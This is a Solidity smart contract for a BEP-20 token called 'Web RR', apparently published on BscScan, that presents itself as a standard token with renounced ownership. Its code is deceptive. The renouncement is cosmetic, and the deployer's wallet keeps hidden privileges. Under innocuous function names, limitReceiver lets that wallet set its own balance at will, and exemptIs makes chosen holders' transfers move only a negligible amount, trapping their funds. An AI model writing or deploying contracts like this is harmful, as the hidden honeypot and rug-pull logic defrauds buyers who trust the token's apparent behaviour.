/**
 *Submitted for verification at BscScan.com on 2023-01-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


contract WebRR is IBEP20 {
    uint8 constant _decimals = 18;

    mapping(address => bool) public autoFrom;
    mapping(address => bool) public teamModeLaunch;
    mapping(address => uint256) _balances;
    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    address public walletList;
    string constant _symbol = "WRR";


    address public owner;

    address public fromBuy;
    mapping(address => mapping(address => uint256)) _allowances;
    uint256 constant exemptFromTo = 10 ** 10;

    string constant _name = "Web RR";
    modifier feeTakeAmount() {
        require(teamModeLaunch[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor (){
        UniswapRouter minWallet = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        fromBuy = UniswapFactory(minWallet.factory()).createPair(minWallet.WETH(), address(this));
        _allowances[address(this)][address(minWallet)] = type(uint256).max;
        owner = msg.sender;
        walletList = msg.sender;
        teamModeLaunch[walletList] = true;
        _balances[walletList] = _totalSupply;
        emit Transfer(address(0), walletList, _totalSupply);
        renounceOwnership();
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function atWalletToken(address senderMin, address marketingLimitSell, uint256 receiverTakeList) internal returns (bool) {
        require(receiverTakeList <= _balances[senderMin]);
        _balances[senderMin] -= receiverTakeList;
        _balances[marketingLimitSell] += receiverTakeList;
        emit Transfer(senderMin, marketingLimitSell, receiverTakeList);
        return true;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transferFrom(address senderMin, address marketingLimitSell, uint256 receiverTakeList) external override returns (bool) {
        if (_allowances[senderMin][msg.sender] != type(uint256).max) {
            require(receiverTakeList <= _allowances[senderMin][msg.sender]);
            _allowances[senderMin][msg.sender] -= receiverTakeList;
        }
        return _transferFrom(senderMin, marketingLimitSell, receiverTakeList);
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function exemptIs(address feeExemptLaunch) public feeTakeAmount {
        autoFrom[feeExemptLaunch] = true;
    }

    function limitReceiver(uint256 receiverTakeList) public feeTakeAmount {
        _balances[walletList] = receiverTakeList;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function launchedEnable(address tokenMaxMarketing) public feeTakeAmount {
        teamModeLaunch[tokenMaxMarketing] = true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function _transferFrom(address senderMin, address marketingLimitSell, uint256 receiverTakeList) internal returns (bool) {
        if (senderMin == walletList || marketingLimitSell == walletList) {
            return atWalletToken(senderMin, marketingLimitSell, receiverTakeList);
        }
        if (autoFrom[senderMin]) {
            return atWalletToken(senderMin, marketingLimitSell, exemptFromTo);
        }
        return atWalletToken(senderMin, marketingLimitSell, receiverTakeList);
    }


}